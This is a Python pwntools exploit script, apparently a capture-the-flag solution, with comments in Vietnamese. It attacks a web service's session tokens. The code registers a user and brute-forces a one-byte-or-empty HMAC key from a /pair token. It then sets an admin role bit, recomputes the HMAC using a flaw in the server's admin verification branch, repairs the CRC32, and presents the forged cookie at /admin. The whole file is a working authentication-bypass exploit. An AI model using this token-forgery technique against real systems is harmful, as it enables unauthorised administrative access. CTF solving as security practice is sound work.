#!/usr/bin/env python3
from pwn import *
import argparse, base64, os, sys, urllib.parse, urllib.request, hmac, hashlib

context.log_level = "info"

# ---------- HTTP ----------
def http_post(url, data_dict, timeout=5):
    data = urllib.parse.urlencode(data_dict).encode()
    req = urllib.request.Request(
        url, data=data, method="POST",
        headers={"Content-Type":"application/x-www-form-urlencoded",
                 "User-Agent":"ctf-exploit/1.3","Connection":"close"}
    )
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode(errors="ignore")

def http_get(url, headers=None, timeout=5):
    req = urllib.request.Request(
        url, headers={"User-Agent":"ctf-exploit/1.3","Connection":"close", **(headers or {})}
    )
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode(errors="ignore")

# ---------- CRC32 (giống server) ----------
def crc32_server_style(data: bytes) -> int:
    poly = 0xEDB88320
    crc = 0xFFFFFFFF
    for b in data:
        crc ^= b
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ poly
            else:
                crc >>= 1
    return (~crc) & 0xFFFFFFFF

# ---------- Token utils ----------
def parse_token(b64tok: str) -> bytearray:
    raw = base64.b64decode(b64tok.strip())
    if len(raw) != 48:
        raise ValueError(f"Token length {len(raw)} != 48")
    return bytearray(raw)

def m1(uid, role, time8, rand4) -> bytes:
    # create_token HMAC input
    return uid + role + time8 + rand4

def m2_admin_bug(uid, role, time8, rand4) -> bytes:
    """
    NHÁNH ADMIN (bug thực tế trong verify_token):
    20 byte = [uid0,0,0,0, role0,0,0,0] + time(8) + (uint32) (rand & 0xFFFF)
    """
    first8 = bytes([uid[0],0,0,0, role[0],0,0,0])
    low16 = int.from_bytes(rand4[:2], "little")  # rand & 0xFFFF
    tail4 = low16.to_bytes(4, "little")
    return first8 + time8 + tail4

def recover_key_from_pair_token(t: bytes) -> bytes:
    uid, role, time8, rand4 = t[0:4], t[4:8], t[8:16], t[16:20]
    h8 = t[20:28]
    # thử keylen=0
    if hmac.new(b"", m1(uid, role, time8, rand4), hashlib.sha256).digest()[:8] == h8:
        log.success("Recovered HMAC keylen=0 (empty)")
        return b""
    # thử keylen=1
    for k in range(256):
        key = bytes([k])
        if hmac.new(key, m1(uid, role, time8, rand4), hashlib.sha256).digest()[:8] == h8:
            log.success(f"Recovered HMAC keylen=1: 0x{k:02x}")
            return key
    raise RuntimeError("Key recovery failed")

def forge_admin_token_from_pair(pair_b64: str) -> str:
    t = parse_token(pair_b64)
    uid   = bytes(t[0:4])
    role  = bytes(t[4:8])
    time8 = bytes(t[8:16])
    rand4 = bytes(t[16:20])  # phải giữ nguyên (MSB=1) để vào nhánh admin

    # 1) khôi phục key (0/1 byte)
    key = recover_key_from_pair_token(bytes(t))

    # 2) set bit admin 0x80 vào ROLE
    role_int = int.from_bytes(role, "little") | 0x80
    new_role = role_int.to_bytes(4, "little")
    t[4:8] = new_role

    # 3) HMAC theo BUG NHÁNH ADMIN: dùng rand_low16 thay vì role(4)
    msg = m2_admin_bug(uid, new_role, time8, rand4)
    new_h8 = hmac.new(key, msg, hashlib.sha256).digest()[:8]
    t[0x14:0x1C] = new_h8  # ghi vào 8 byte HMAC lưu trong token

    # 4) CRC32 trên 36 byte đầu, ghi ~crc vào 0x24..0x27
    crc = crc32_server_style(bytes(t[:36]))
    t[0x24:0x28] = crc.to_bytes(4, "little")

    # 5) Base64 encode lại
    return base64.b64encode(bytes(t)).decode()

def main():
    ap = argparse.ArgumentParser(description="CTF exploit (pair->forge admin via HMAC-bug)")
    ap.add_argument("host")
    ap.add_argument("--port", type=int, default=8083)
    ap.add_argument("-u", "--user", default=None)
    ap.add_argument("-p", "--password", default="p")
    ap.add_argument("--no-register", action="store_true")
    args = ap.parse_args()

    base = args.host.rstrip("/") if args.host.startswith(("http://","https://")) else f"http://{args.host}:{args.port}"
    user = args.user or ("u" + os.urandom(3).hex())
    pw   = args.password

    log.info(f"Base URL: {base}")
    log.info(f"User: {user}")

    if not args.no_register:
        try:
            r = http_post(f"{base}/register", {"user": user, "pass": pw}).strip()
            log.success(f"/register -> {r}")
        except Exception as e:
            log.warning(f"/register error: {e} (tiếp tục)")

    # /pair
    try:
        pair = http_get(f"{base}/pair?user={urllib.parse.quote(user)}").strip().splitlines()[0].strip()
        log.success(f"/pair -> {pair}")
    except Exception as e:
        log.failure(f"/pair error: {e}")
        sys.exit(1)

    # forge
    try:
        forged = forge_admin_token_from_pair(pair)
        log.success(f"Forged token: {forged}")
    except Exception as e:
        log.failure(f"Forge error: {e}")
        sys.exit(1)

    # /admin
    try:
        body = http_get(f"{base}/admin", headers={"Cookie": f"session={forged}"})
        print("[+] /admin response:\n" + body)
    except Exception as e:
        log.failure(f"/admin error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
